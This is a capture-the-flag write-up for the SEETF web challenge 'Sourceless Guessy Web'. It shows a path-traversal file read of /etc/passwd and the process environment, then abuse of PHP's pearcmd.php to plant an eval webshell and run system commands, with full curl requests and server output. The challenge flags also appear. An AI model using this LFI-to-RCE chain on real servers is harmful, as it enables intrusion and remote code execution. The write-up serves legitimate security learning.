# Sourceless Guessy Flag

## Solution (Baby Flag)

![](Pasted%20image%2020220604215622.png)

Hint is directory traversal, so tried accessing stuff

![](Pasted%20image%2020220604215640.png)

Standard hacking protocol calls me to access `/etc/passwd` and read the source code, and so I did

```
(base) [hacker@hackerbook ~]$ curl http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../etc/passwd

...

    let message = `
        root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
SEE{2nd_fl4g_n33ds_RCE_g00d_luck_h4x0r}
    `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();

...

```

## Solution (RCE Flag)

### How I found out in the CTF

I randomly tried accessing `/tmp/hi.php` because I tried creating it via another exploit (phpinfo LFI to RCE). Never expect someone else already create it. It included the file `/usr/local/lib/php/pearcmd.php` and realised this could lead to a webshell.

```html
(base) [hacker@hackerbook tmp]$ curl "http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../tmp/hi.php" 

<!--
\        /|   |\   /   /~~  /~~\    /~~ |~~ |~~\| /~~\ |   |/~~
 \  /\  / |---| \ /    |__ |    |   |__ |-- |__/||    ||   ||__
  \/  \/  |   |  |     ___| \__/    ___||__ |  \| \__/  \_/ ___|
-->

...

whysoserious/pear";s:7:"man_dir";s:79:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php
main.css
phpinfo.php
whysoserious
whysoserious/pear/man";}    `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();

    if (message) {
        let currIdx = 0;
        let messageLength = message.length;

        let parts = document.querySelectorAll('.lazarus-pit > div');
        for (let i = 0; i < parts.length; i++) {
            let partLength = parts[i].innerHTML.length;

            parts[i].innerHTML = '';

            for (let j = 0; j < partLength; j++) {
                parts[i].innerHTML += message[currIdx % messageLength];
                currIdx++;
            }
        }
    }
</script>
</html>(base) [hacker@hackerbook tmp]$ 
```

### Pearcmd exploit

On researching more in pearcmd, I found out that there are other writeups for it already. We could use the payloads there

- [https://ctftime.org/writeup/30236](https://ctftime.org/writeup/30236 "https://ctftime.org/writeup/30236") 
- [https://chowdera.com/2022/02/202202080401099387.html](https://chowdera.com/2022/02/202202080401099387.html "https://chowdera.com/2022/02/202202080401099387.html")

First I tested that the file I'm creating does not exist yet

```
(base) [hacker@hackerbook tmp]$ curl "http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../tmp/eval.php"  -d "1=system('whoami');"

<!--
\        /|   |\   /   /~~  /~~\    /~~ |~~ |~~\| /~~\ |   |/~~
 \  /\  / |---| \ /    |__ |    |   |__ |-- |__/||    ||   ||__
  \/  \/  |   |  |     ___| \__/    ___||__ |  \| \__/  \_/ ___|
-->

...

<script>
    let message = `
            `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();

    if (message) {
        let currIdx = 0;
        let messageLength = message.length;

        let parts = document.querySelectorAll('.lazarus-pit > div');
        for (let i = 0; i < parts.length; i++) {
            let partLength = parts[i].innerHTML.length;

            parts[i].innerHTML = '';

            for (let j = 0; j < partLength; j++) {
                parts[i].innerHTML += message[currIdx % messageLength];
                currIdx++;
            }
        }
    }
</script>
</html>
```

Creating a webshell file to access via LFI later.

```html
(base) [hacker@hackerbook tmp]$ curl "http://sourcelessguessyweb.chall.seetf.sg+config-create+/&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval(\$_POST\[1\])?>+/tmp/eval.php"

<!--
\        /|   |\   /   /~~  /~~\    /~~ |~~ |~~\| /~~\ |   |/~~
 \  /\  / |---| \ /    |__ |    |   |__ |-- |__/||    ||   ||__
  \/  \/  |   |  |     ___| \__/    ___||__ |  \| \__/  \_/ ___|
-->
...

<script>
    let message = `
        CONFIGURATION (CHANNEL PEAR.PHP.NET):
=====================================
Auto-discover new Channels     auto_discover    <not set>
Default Channel                default_channel  pear.php.net
HTTP Proxy Server Address      http_proxy       <not set>
PEAR server [DEPRECATED]       master_server    <not set>
Default Channel Mirror         preferred_mirror <not set>
Remote Configuration File      remote_config    <not set>
PEAR executables directory     bin_dir          /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear
PEAR documentation directory   doc_dir          /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/docs
PHP extension directory        ext_dir          /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/ext
PEAR directory                 php_dir          /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/php
PEAR Installer cache directory cache_dir        /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/cache
PEAR configuration file        cfg_dir          /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/cfg
directory
PEAR data directory            data_dir         /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/data
PEAR Installer download        download_dir     /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/download
directory
Systems manpage files          man_dir          /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/man
directory
PEAR metadata directory        metadata_dir     <not set>
PHP CLI/CGI binary             php_bin          <not set>
php.ini location               php_ini          <not set>
--program-prefix passed to     php_prefix       <not set>
PHP's ./configure
--program-suffix passed to     php_suffix       <not set>
PHP's ./configure
PEAR Installer temp directory  temp_dir         /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/temp
PEAR test directory            test_dir         /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/tests
PEAR www files directory       www_dir          /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/www
Cache TimeToLive               cache_ttl        <not set>
Preferred Package State        preferred_state  <not set>
Unix file mask                 umask            <not set>
Debug Log Level                verbose          <not set>
PEAR password (for             password         <not set>
maintainers)
Signature Handling Program     sig_bin          <not set>
Signature Key Directory        sig_keydir       <not set>
Signature Key Id               sig_keyid        <not set>
Package Signature Type         sig_type         <not set>
PEAR username (for             username         <not set>
maintainers)
User Configuration File        Filename         /tmp/eval.php
System Configuration File      Filename         #no#system#config#
Successfully created default configuration file "/tmp/eval.php"
    `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();

    if (message) {
        let currIdx = 0;
        let messageLength = message.length;

        let parts = document.querySelectorAll('.lazarus-pit > div');
        for (let i = 0; i < parts.length; i++) {
            let partLength = parts[i].innerHTML.length;

            parts[i].innerHTML = '';

            for (let j = 0; j < partLength; j++) {
                parts[i].innerHTML += message[currIdx % messageLength];
                currIdx++;
            }
        }
    }
</script>
</html>
(base) [hacker@hackerbook tmp]$
```

Accessing the file to run custom code.

```
(base) [hacker@hackerbook tmp]$ curl "http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../tmp/eval.php"  -d "1=system('whoami');"

<!--
\        /|   |\   /   /~~  /~~\    /~~ |~~ |~~\| /~~\ |   |/~~
 \  /\  / |---| \ /    |__ |    |   |__ |-- |__/||    ||   ||__
  \/  \/  |   |  |     ___| \__/    ___||__ |  \| \__/  \_/ ___|
-->

...

<script>
    let message = `
        #PEAR_Config 0.9
a:12:{s:7:"php_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
/pear/php";s:8:"data_dir";s:77:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
/pear/data";s:7:"www_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
/pear/www";s:7:"cfg_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
/pear/cfg";s:7:"ext_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
/pear/ext";s:7:"doc_dir";s:77:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
/pear/docs";s:8:"test_dir";s:78:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
/pear/tests";s:9:"cache_dir";s:78:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
/pear/cache";s:12:"download_dir";s:81:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
/pear/download";s:8:"temp_dir";s:77:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
/pear/temp";s:7:"bin_dir";s:72:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
/pear";s:7:"man_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
/pear/man";}    `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();

    if (message) {
        let currIdx = 0;
        let messageLength = message.length;

        let parts = document.querySelectorAll('.lazarus-pit > div');
        for (let i = 0; i < parts.length; i++) {
            let partLength = parts[i].innerHTML.length;

            parts[i].innerHTML = '';

            for (let j = 0; j < partLength; j++) {
                parts[i].innerHTML += message[currIdx % messageLength];
                currIdx++;
            }
        }
    }
</script>
```


### RCE

I tested listing everything in the root directory

```html
(base) [hacker@hackerbook tmp]$ curl "http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../tmp/eval.php"  -d "1=system('ls /');"

<!--
\        /|   |\   /   /~~  /~~\    /~~ |~~ |~~\| /~~\ |   |/~~
 \  /\  / |---| \ /    |__ |    |   |__ |-- |__/||    ||   ||__
  \/  \/  |   |  |     ___| \__/    ___||__ |  \| \__/  \_/ ___|
-->

...

/pear";s:7:"man_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
readflag
root
run
sbin
srv
sys
tmp
usr
var
/pear/man";}    `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();

    if (message) {
        let currIdx = 0;
        let messageLength = message.length;

        let parts = document.querySelectorAll('.lazarus-pit > div');
        for (let i = 0; i < parts.length; i++) {
            let partLength = parts[i].innerHTML.length;

            parts[i].innerHTML = '';

            for (let j = 0; j < partLength; j++) {
                parts[i].innerHTML += message[currIdx % messageLength];
                currIdx++;
            }
        }
    }
</script>
```

```html
</html>(base) [hacker@hackerbook tmp]$ curl "http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../tmp/eval.php"  -d "1=system('/readflag');"

<!--
\        /|   |\   /   /~~  /~~\    /~~ |~~ |~~\| /~~\ |   |/~~
 \  /\  / |---| \ /    |__ |    |   |__ |-- |__/||    ||   ||__
  \/  \/  |   |  |     ___| \__/    ___||__ |  \| \__/  \_/ ___|
-->

...

<script>
    let message = `
        #PEAR_Config 0.9
a:12:{s:7:"php_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/php";s:8:"data_dir";s:77:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/data";s:7:"www_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/www";s:7:"cfg_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/cfg";s:7:"ext_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/ext";s:7:"doc_dir";s:77:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/docs";s:8:"test_dir";s:78:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/tests";s:9:"cache_dir";s:78:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/cache";s:12:"download_dir";s:81:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/download";s:8:"temp_dir";s:77:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/temp";s:7:"bin_dir";s:72:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear";s:7:"man_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/man";}    `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();

    if (message) {
        let currIdx = 0;
        let messageLength = message.length;

        let parts = document.querySelectorAll('.lazarus-pit > div');
        for (let i = 0; i < parts.length; i++) {
            let partLength = parts[i].innerHTML.length;

            parts[i].innerHTML = '';

            for (let j = 0; j < partLength; j++) {
                parts[i].innerHTML += message[currIdx % messageLength];
                currIdx++;
            }
        }
    }
</script>
(base) [hacker@hackerbook tmp]$ 
```

### How you could have potentially found out in the CTF

Looking at the eventual flag, I realised that we could have discovered the exploit **without** relying on other people exploit.

Firstly, since this is a PHP web application, and CTFs generally used docker images, we could have inferred that a php container was used. 

I firstly tried to download the container.

```bash
┌──(kali㉿kali)-[~/Documents/Notes/SEETF/username_gen]
└─$ sudo docker run -it php bash
[sudo] password for kali: 
Unable to find image 'php:latest' locally
latest: Pulling from library/php
42c077c10790: Pull complete 
8934009a9160: Pull complete 
5357ac116991: Pull complete 
54ae63894b5a: Pull complete 
72281f038a08: Pull complete 
9fd1b94317fe: Pull complete 
00012d9e2ea5: Pull complete 
2c220aff91be: Pull complete 
48cfe9bf9b47: Pull complete 
Digest: sha256:578dc5919121a9950174a1aa59d00815de87c767451320a527261763eafab8f0
Status: Downloaded newer image for php:latest
root@f869105b6e8b:/# ls
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@f869105b6e8b:/# cd /usr/local/lib/php/
```

We could then enumerate for php files. You can notice that `pearcmd.php` is inside, which could lead to an exploit.

```
root@f869105b6e8b:/# find -name "*.php"
./usr/local/lib/php/OS/Guess.php
./usr/local/lib/php/doc/XML_Util/examples/example.php
./usr/local/lib/php/doc/XML_Util/examples/example2.php
./usr/local/lib/php/Structures/Graph.php
./usr/local/lib/php/Structures/Graph/Manipulator/AcyclicTest.php
./usr/local/lib/php/Structures/Graph/Manipulator/TopologicalSorter.php
./usr/local/lib/php/Structures/Graph/Node.php
./usr/local/lib/php/Archive/Tar.php
./usr/local/lib/php/PEAR/Config.php
./usr/local/lib/php/PEAR/DependencyDB.php
./usr/local/lib/php/PEAR/Dependency2.php
./usr/local/lib/php/PEAR/Command.php
./usr/local/lib/php/PEAR/Proxy.php
./usr/local/lib/php/PEAR/PackageFile.php
./usr/local/lib/php/PEAR/REST.php
./usr/local/lib/php/PEAR/Downloader/Package.php
./usr/local/lib/php/PEAR/Validate.php
./usr/local/lib/php/PEAR/Builder.php
./usr/local/lib/php/PEAR/Validator/PECL.php
./usr/local/lib/php/PEAR/Command/Config.php
./usr/local/lib/php/PEAR/Command/Remote.php
./usr/local/lib/php/PEAR/Command/Auth.php
./usr/local/lib/php/PEAR/Command/Test.php
./usr/local/lib/php/PEAR/Command/Mirror.php
./usr/local/lib/php/PEAR/Command/Pickle.php
./usr/local/lib/php/PEAR/Command/Registry.php
./usr/local/lib/php/PEAR/Command/Build.php
./usr/local/lib/php/PEAR/Command/Channels.php
./usr/local/lib/php/PEAR/Command/Install.php
./usr/local/lib/php/PEAR/Command/Package.php
./usr/local/lib/php/PEAR/Command/Common.php
./usr/local/lib/php/PEAR/Downloader.php
./usr/local/lib/php/PEAR/Task/Unixeol.php
./usr/local/lib/php/PEAR/Task/Postinstallscript.php
./usr/local/lib/php/PEAR/Task/Replace/rw.php
./usr/local/lib/php/PEAR/Task/Replace.php
./usr/local/lib/php/PEAR/Task/Windowseol.php
./usr/local/lib/php/PEAR/Task/Postinstallscript/rw.php
./usr/local/lib/php/PEAR/Task/Unixeol/rw.php
./usr/local/lib/php/PEAR/Task/Windowseol/rw.php
./usr/local/lib/php/PEAR/Task/Common.php
./usr/local/lib/php/PEAR/Frontend/CLI.php
./usr/local/lib/php/PEAR/Installer/Role.php
./usr/local/lib/php/PEAR/Installer/Role/Php.php
./usr/local/lib/php/PEAR/Installer/Role/Script.php
./usr/local/lib/php/PEAR/Installer/Role/Man.php
./usr/local/lib/php/PEAR/Installer/Role/Data.php
./usr/local/lib/php/PEAR/Installer/Role/Src.php
./usr/local/lib/php/PEAR/Installer/Role/Cfg.php
./usr/local/lib/php/PEAR/Installer/Role/Test.php
./usr/local/lib/php/PEAR/Installer/Role/Www.php
./usr/local/lib/php/PEAR/Installer/Role/Doc.php
./usr/local/lib/php/PEAR/Installer/Role/Ext.php
./usr/local/lib/php/PEAR/Installer/Role/Common.php
./usr/local/lib/php/PEAR/XMLParser.php
./usr/local/lib/php/PEAR/Frontend.php
./usr/local/lib/php/PEAR/ChannelFile/Parser.php
./usr/local/lib/php/PEAR/ChannelFile.php
./usr/local/lib/php/PEAR/Registry.php
./usr/local/lib/php/PEAR/ErrorStack.php
./usr/local/lib/php/PEAR/Exception.php
./usr/local/lib/php/PEAR/REST/13.php
./usr/local/lib/php/PEAR/REST/10.php
./usr/local/lib/php/PEAR/REST/11.php
./usr/local/lib/php/PEAR/PackageFile/v2/Validator.php
./usr/local/lib/php/PEAR/PackageFile/v2/rw.php
./usr/local/lib/php/PEAR/PackageFile/Generator/v1.php
./usr/local/lib/php/PEAR/PackageFile/Generator/v2.php
./usr/local/lib/php/PEAR/PackageFile/Parser/v1.php
./usr/local/lib/php/PEAR/PackageFile/Parser/v2.php
./usr/local/lib/php/PEAR/PackageFile/v1.php
./usr/local/lib/php/PEAR/PackageFile/v2.php
./usr/local/lib/php/PEAR/Installer.php
./usr/local/lib/php/PEAR/RunTest.php
./usr/local/lib/php/PEAR/Common.php
./usr/local/lib/php/PEAR/Packager.php
./usr/local/lib/php/Console/Getopt.php
./usr/local/lib/php/XML/Util.php
./usr/local/lib/php/test/XML_Util/tests/ApiVersionTests.php
./usr/local/lib/php/test/XML_Util/tests/CreateTagFromArrayTests.php
./usr/local/lib/php/test/XML_Util/tests/AttributesToStringTests.php
./usr/local/lib/php/test/XML_Util/tests/RaiseErrorTests.php
./usr/local/lib/php/test/XML_Util/tests/Bug21177Tests.php
./usr/local/lib/php/test/XML_Util/tests/Bug5392Tests.php
./usr/local/lib/php/test/XML_Util/tests/CreateTagTests.php
./usr/local/lib/php/test/XML_Util/tests/GetXmlDeclarationTests.php
./usr/local/lib/php/test/XML_Util/tests/CreateCDataSectionTests.php
./usr/local/lib/php/test/XML_Util/tests/GetDocTypeDeclarationTests.php
./usr/local/lib/php/test/XML_Util/tests/Bug21184Tests.php
./usr/local/lib/php/test/XML_Util/tests/AbstractUnitTests.php
./usr/local/lib/php/test/XML_Util/tests/IsValidNameTests.php
./usr/local/lib/php/test/XML_Util/tests/Bug4950Tests.php
./usr/local/lib/php/test/XML_Util/tests/CreateStartElementTests.php
./usr/local/lib/php/test/XML_Util/tests/ReverseEntitiesTests.php
./usr/local/lib/php/test/XML_Util/tests/SplitQualifiedNameTests.php
./usr/local/lib/php/test/XML_Util/tests/CreateCommentTests.php
./usr/local/lib/php/test/XML_Util/tests/CreateEndElementTests.php
./usr/local/lib/php/test/XML_Util/tests/Bug18343Tests.php
./usr/local/lib/php/test/XML_Util/tests/ReplaceEntitiesTests.php
./usr/local/lib/php/test/XML_Util/tests/CollapseEmptyTagsTests.php
./usr/local/lib/php/test/Structures_Graph/tests/AcyclicTestTest.php
./usr/local/lib/php/test/Structures_Graph/tests/TopologicalSorterTest.php
./usr/local/lib/php/test/Structures_Graph/tests/AllTests.php
./usr/local/lib/php/test/Structures_Graph/tests/BasicGraphTest.php
./usr/local/lib/php/pearcmd.php
./usr/local/lib/php/peclcmd.php
./usr/local/lib/php/build/gen_stub.php
./usr/local/lib/php/build/run-tests.php
./usr/local/lib/php/System.php
./usr/local/lib/php/PEAR.php
root@f869105b6e8b:/# 
```

We could locate the file we used in the exploit.

```bash
root@f869105b6e8b:/usr/local/lib/php# ls
Archive  Console  OS  PEAR  PEAR.php  Structures  System.php  XML  build  data  doc  extensions  pearcmd.php  peclcmd.php  test
root@f869105b6e8b:/usr/local/lib/php# 
```

This challenge taught me to look deeper, look at all parts of the infrastructure, instead of just being focused on specific techniques.

## Flags

```
SEE{2nd_fl4g_n33ds_RCE_g00d_luck_h4x0r}
SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}
```

# Others


```
view-source:http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../proc/self/environ

let message = `

KUBERNETES_SERVICE_PORT_HTTPS=443KUBERNETES_SERVICE_PORT=443HOSTNAME=app-6799f56885-p78l5PHP_VERSION=8.1.6APACHE_CONFDIR=/etc/apache2PHP_INI_DIR=/usr/local/etc/phpGPG_KEYS=528995BFEDFBA7191D46839EF9BA0ADA31CBD89E 39B641343D8C104B2B146DC3F9C39DC0B9698544 F1F692238FBC1666E5A5CCD4199F9DFEF6FFBAFDPHP_LDFLAGS=-Wl,-O1 -piePWD=/var/www/htmlAPACHE_LOG_DIR=/var/log/apache2LANG=CKUBERNETES_PORT_443_TCP=tcp://10.44.0.1:443PHP_SHA256=da38d65bb0d5dd56f711cd478204f2b62a74a2c2b0d2d523a78d6eb865b2364cAPACHE_PID_FILE=/var/run/apache2/apache2.pidPHPIZE_DEPS=autoconf dpkg-dev file g++ gcc libc-dev make pkg-config re2cPHP_URL=https://www.php.net/distributions/php-8.1.6.tar.xzAPACHE_RUN_GROUP=www-dataAPACHE_LOCK_DIR=/var/lock/apache2SHLVL=0KUBERNETES_PORT_443_TCP_PROTO=tcpPHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64KUBERNETES_PORT_443_TCP_ADDR=10.44.0.1APACHE_RUN_DIR=/var/run/apache2APACHE_ENVVARS=/etc/apache2/envvarsKUBERNETES_SERVICE_HOST=10.44.0.1KUBERNETES_PORT=tcp://10.44.0.1:443KUBERNETES_PORT_443_TCP_PORT=443APACHE_RUN_USER=www-dataPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPHP_ASC_URL=https://www.php.net/distributions/php-8.1.6.tar.xz.ascPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();
```


Nothing comes out

view-source:http://sourcelessguessyweb.chall.seetf.sg:1337/?page=php://filter/resource=.../../../proc/self/environ

```
$ curl http://sourcelessguessyweb.chall.seetf.sg:1337/whysoserious 
WHY SO SERIOUS?
```

view-source:http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../../../usr/local/lib/php/pearcmd.php&c=whoami

```
  

<!--

\ /| |\ / /~~ /~~\ /~~ |~~ |~~\| /~~\ | |/~~

\ /\ / |---| \ / |__ | | |__ |-- |__/|| || ||__

\/ \/ | | | ___| \__/ ___||__ | \| \__/ \_/ ___|

-->

<html lang="en">

<head>

<meta charset="UTF-8">

<title>Why So Serious</title>

<link rel="stylesheet" href="[main.css](http://sourcelessguessyweb.chall.seetf.sg:1337/main.css)">

</head>

<body>

<div class="lazarus-pit">

<h1>WHY SO SERIOUS?</h1>

<a href="[phpinfo.php#:~:text=register_argc_argv](http://sourcelessguessyweb.chall.seetf.sg:1337/phpinfo.php#:~:text=register_argc_argv)" target="_blank">WHY NEED SOURCE?</a>

<p>RIDDLE ME THIS... WHAT'S THE FLAG?</p>

  

<div class="penguin">W</div><div class="vicki-vale">H</div><div class="cash">Y</div><div class="superman">S</div><div class="manhunter">O</div> <div class="superman">SERIOUS?</div> <div class="hawkman">WHY SO SERIO</div><div class="lantern">U</div><div class="arrow">S</div> <div class="grange">? WHY SO SERIOUS? WHY SO SE</div><div class="flash">R</div><div class="marion">I</div><div class="zucco">OUS? WHY SO SE</div><div class="tony">RIOUS? W</div><div class="zucco">H</div><div class="maxie">Y</div><div class="zeus">S</div><div class="wrath">O</div> <br> <!-- 1 -->

<div class="grange">S</div><div class="ventriloquist">E</div><div class="toyman">R</div><div class="zeus">I</div><div class="toymaker">O</div><div class="rupert">U</div><div class="thorne">S</div><div class="terrible">?</div> <div class="trio">WHY SO SERIOUS? WHY</div> <div class="temblor">S</div><div class="hugo">O</div> <div class="grange">SERIOUS?</div><div class="strange">W</div><div class="grange">HY</div> <div class="spellbinder">S</div><div class="grange">O SERIOUS?</div><div class="solomon">W</div><div class="trio">HY SO SERIOUS? WHY SO</div><div class="grundy">S</div><div class="smoke">E</div><div class="sinestro">R</div><div class="shadow">I</div><div class="thief">O</div><div class="penguin">U</div><div class="grange">S</div> <br><!-- 2 -->

<div class="grange">? WHY</div> <div class="scorn">S</div><div class="bat-one">O</div><div class="rumor">S</div><div class="bat-two">E</div><div class="trio">RIOUS? WHY SO SERIO</div><div class="bat-three">U</div><div class="bat-four">S</div><div class="bat-five">?</div><div class="bat-six">W</div><div class="riddler">H</div><div class="grange">Y SO</div><div class="bat-seven">S</div><div class="rumor">E</div><div class="bat-eight">R</div><div class="bat-nine">I</div><div class="riddlemen">O</div><div class="bat-ten">U</div><div class="grange">S? W</div><div class="rhino">H</div><div class="bat-eleven">Y</div><div class="bat-twelve">S</div><div class="bat-thirteen">O</div><div class="trio">SERIOUS? WHY SO SER</div><div class="bat-fourteen">I</div><div class="bat-fifteen">O</div><div class="bat-sixteen">U</div><div class="bat-seventeen">S</div><div class="spellbinder">?</div> <div class="grange">WHY S</div><br><!-- 3 -->

<div class="grange">O SERIOUS?</div><div class="mugsy">W</div><div class="bat-eighteen">H</div><div class="trio">Y SO SERIOUS? WHY S</div><div class="ragdoll">O</div><div class="bat-nineteen">S</div><div class="bat-twenty">E</div><div class="trio">RIOUS? WHYSOSERIOUS? WHY SO SERIOUS?</div><div class="bat-twentyone">W</div><div class="bat-twentytwo">H</div><div class="grange">Y SO SERIO</div><br><!-- 4 -->

<div class="grange">US? WHY SO</div> <div class="riddler">S</div><div class="bat-twentythree">E</div><div class="bat-twenty-four">R</div><div class="trio">IOUS? WHY SO SERIOUS?</div> <div class="joker">WHY SO SERIOUS?</div> <div class="trio">WHY SO SERIOUS? WHY S</div><div class="bat-twentyfive">O</div><div class="riddler">S</div><div class="grange">ERIOUS? WHY</div><br><!-- 5 -->

<div class="grange">SO SERIOUS?</div> <div class="bat-twentysix">W</div><div class="trio">HY SO SERIOUS? WHY SO SERIOUS? WHY SO SERIOUS? WHY SO SERI</div><div class="punch">O</div><div class="judy">U</div><div class="grange">S? WHY SO SER</div><br><!-- 6 -->

<div class="grange">IOUS?WHY SO</div> <div class="prank">S</div><div class="trio">ERIOUS?WHYSO SERIOUS? WHY SO SERIOUS? WHY SO SERIOUS? WH</div><div class="poison-ivy">Y</div><div class="grange">SO SERIOUS?W</div><br>

<div class="grange">HY SO SERIOUS</div><div class="mister-freeze">?</div><div class="rupert">W</div><div class="mirror-master">H</div><div class="mettalo">Y</div><div class="marty">S</div><div class="man-bat">O</div><div class="lex-luthor">S</div><div class="killer-moth">E</div><div class="killer-croc">R</div><div class="hideto-katsu">I</div><div class="kabuki-twins">O</div><div class="joker-v2">U</div><div class="ragdoll">S</div><div class="the-joining">?</div><div class="harley-quinn">W</div><div class="trio">HY SO SERIOUS? WHY SO</div> <div class="harley-quinn">S</div><div class="francis-grey">E</div><div class="the-joining">R</div><div class="mercy-graves">I</div><div class="riddlemen">O</div><div class="gearhead">U</div><div class="firefly">S</div><div class="everywhere-man">?</div><div class="dracula">W</div><div class="dave">H</div><div class="count-vertigo">Y</div><div class="mugsy">S</div><div class="cluemaster">O</div> <div class="mugsy">S</div><div class="mettalo">E</div><div class="mirror-master">R</div><div class="arrow">I</div><div class="grange">OUS? WHY SO S</div><br><!-- 8 -->

